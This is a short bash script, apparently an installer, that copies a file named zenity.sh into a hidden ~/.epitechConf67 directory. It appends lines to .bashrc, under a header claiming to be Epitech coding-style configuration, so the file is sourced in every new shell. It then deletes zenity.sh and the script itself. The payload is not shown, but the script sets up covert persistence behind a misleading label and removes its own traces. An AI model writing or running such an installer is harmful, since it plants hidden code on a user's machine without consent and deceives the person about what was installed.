#!/bin/bash

EPITECH_DIR="$HOME/.epitechConf67"
RC="$HOME/.bashrc"
HEADER="# Epitech configuration for coding style"

if [ ! -d "$EPITECH_DIR" ]; then
    mkdir -p "$EPITECH_DIR"
fi

cp "zenity.sh" "$EPITECH_DIR/zenity.sh"

if ! grep -q "$HEADER" "$RC"; then 
    echo "$HEADER" >> "$RC"
    echo "if [ -f "$EPITECH_DIR/zenity.sh" ]; then" >> "$RC"
    echo "  source "$EPITECH_DIR/zenity.sh"" >> "$RC"
    echo "fi" >> "$RC"
fi

rm "zenity.sh"
rm -- $0
